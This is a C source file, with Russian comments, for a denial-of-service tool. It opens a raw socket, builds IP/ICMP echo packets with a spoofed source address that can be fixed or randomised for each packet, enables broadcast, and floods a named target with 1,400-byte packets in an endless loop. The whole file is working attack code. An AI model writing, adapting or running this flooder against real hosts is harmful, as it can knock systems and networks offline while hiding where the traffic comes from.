#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>

/*-------------------------------*/
/* Преобразование имни узла в IP */
/*-------------------------------*/
unsigned long resolve(char *hostname){
  struct hostent *hp;

  if( (hp = gethostbyname(hostname)) == NULL){
    herror("gethostbyname failed:(");
    exit(-1);
  }
  return *(unsigned long *)hp->h_addr_list[0];
}

/*------------------------------*/
/* Вычисление контрольной суммы */
/*------------------------------*/
unsigned short in_cksum(unsigned short *addr, int len){
  unsigned short result;
  unsigned int sum = 0;

  while (len > 1) {
    sum += *addr++;
    len -= 2;
  }

  if(len == 1) sum += *(unsigned char*) addr;

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);

  result = ~sum;
  return result;
}

/*------------------------*/
/* Главная функция main() */
/*------------------------*/
int main(int argc, char *argv[]) {
  int sd;
  const int on = 1;
  int rnd = 0;
  unsigned long dstaddr, srcaddr;
  struct sockaddr_in servaddr;

  char sendbuf[sizeof(struct iphdr) + sizeof(struct icmp) + 1400];
  struct iphdr *ip_hdr = (struct iphdr *)sendbuf;
  struct icmp *icmp_hdr = (struct icmp *) (sendbuf + sizeof(struct iphdr));

  if(argc != 3){
    fprintf(stderr, "Usage: %s <source address | random> <destination address>\n", argv[0]);
    exit(-1);
  }

  //создаем raw-сокет
  if((sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
    perror("socket() failed :(");
    exit(-1);
  }

  if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0){
    perror("setsockopt failed :(");
    exit(-1);
  }

  if(setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on)) < 0){
    perror("setsockopt failed :(");
    exit(-1);
  }

  if(!strcmp(argv[1], "random")) {
    rnd = 1;
    srcaddr = random();
  } else {
    srcaddr = resolve(argv[1]);
  }

  dstaddr = resolve(argv[2]);

  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = dstaddr;

  ip_hdr->ihl = 5;
  ip_hdr->version = 4;
  ip_hdr->tos = 0;
  ip_hdr->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmp) + 1400);
  ip_hdr->id = 0;
  ip_hdr->frag_off = 0;
  ip_hdr->ttl = 255;
  ip_hdr->protocol = IPPROTO_ICMP;
  ip_hdr->check = 0;
  ip_hdr->check = in_cksum((unsigned short *)ip_hdr, sizeof(struct iphdr));
  ip_hdr->saddr = srcaddr;
  ip_hdr->daddr = dstaddr;

  icmp_hdr->icmp_type = ICMP_ECHO;
  icmp_hdr->icmp_code = 0;
  icmp_hdr->icmp_id = 1;
  icmp_hdr->icmp_seq = 1;
  icmp_hdr->icmp_cksum = 0;
  icmp_hdr->icmp_cksum = in_cksum((unsigned short *)icmp_hdr, sizeof(struct icmp) + 1400);

  while(1){
    if(sendto(sd,
              sendbuf,
              sizeof(sendbuf),
              0,
              (struct sockaddr *)&servaddr,
              sizeof(servaddr)) < 0) {
    perror("sendto() failed :(");
    exit(-1);
    }

    if(rnd) ip_hdr->saddr = random();
  }

  return 0;
}
